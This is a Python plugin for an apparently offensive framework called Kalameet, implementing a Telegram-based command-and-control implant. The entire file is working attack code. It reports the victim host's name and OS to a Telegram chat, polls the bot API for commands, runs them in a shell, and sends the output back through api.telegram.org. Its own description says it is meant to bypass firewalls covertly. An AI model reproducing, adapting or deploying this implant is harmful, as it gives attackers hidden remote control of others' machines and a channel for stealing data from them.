import requests
import time
import subprocess
import os
import platform
from kalameet.core.base import BasePlugin
from kalameet.core.interface import Colors

class TelegramC2Plugin(BasePlugin):
    meta = {
        'name': 'telegram_c2',
        'description': 'Covert C2 Channel via Telegram Bot (Bypasses Firewalls)',
        'author': 'Kalameet'
    }

    def add_arguments(self, parser):
        parser.add_argument("--token", required=True, help="Telegram Bot Token")
        parser.add_argument("--chatid", required=True, help="Your Chat ID (To prevent others controlling it)")

    def get_updates(self, token, offset=None):
        url = f"https://api.telegram.org/bot{token}/getUpdates?timeout=10"
        if offset:
            url += f"&offset={offset}"
        try:
            return requests.get(url, timeout=15).json()
        except: return None

    def send_msg(self, token, chat_id, text):
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        try:
            requests.post(url, data=data)
        except: pass

    def run(self, args):
        print(f"{Colors.BLUE}[*] TELEGRAM C2 IMPLANT ACTIVE...{Colors.ENDC}")
        print(f"[*] Waiting for commands from Chat ID: {args.chatid}")
        
        # Kirim notifikasi online
        info = f"🐉 KALAMEET AGENT ONLINE\nHost: {platform.node()}\nOS: {platform.system()} {platform.release()}"
        self.send_msg(args.token, args.chatid, info)
        
        offset = None
        
        while True:
            try:
                updates = self.get_updates(args.token, offset)
                if updates and "result" in updates:
                    for item in updates["result"]:
                        offset = item["update_id"] + 1
                        
                        # Cek pesan
                        if "message" in item and "text" in item["message"]:
                            chat_id = str(item["message"]["chat"]["id"])
                            command = item["message"]["text"]
                            
                            # Security Check: Pastikan cuma kita yang perintah
                            if chat_id != args.chatid:
                                continue
                                
                            print(f"[*] Command received: {command}")
                            
                            if command.lower() == '/exit':
                                self.send_msg(args.token, chat_id, "Agent shutting down...")
                                return

                            # Eksekusi Perintah
                            try:
                                # CD Command
                                if command.startswith("cd "):
                                    try:
                                        os.chdir(command[3:].strip())
                                        output = f"Changed dir to: {os.getcwd()}"
                                    except Exception as e:
                                        output = str(e)
                                else:
                                    # Shell Command
                                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                                    stdout, stderr = proc.communicate()
                                    output = stdout.decode() + stderr.decode()
                                    if not output: output = "[Command executed, no output]"
                            except Exception as e:
                                output = f"Execution Error: {e}"
                                
                            # Kirim Balasan ke Telegram
                            # Telegram max 4096 chars, potong kalau kepanjangan
                            if len(output) > 4000:
                                output = output[:4000] + "\n...[Output Truncated]..."
                                
                            self.send_msg(args.token, chat_id, output)
                            
                time.sleep(2) # Jeda polling
            except KeyboardInterrupt:
                print("\n[!] Stopped.")
                break
            except Exception as e:
                time.sleep(5) # Tunggu kalau internet putus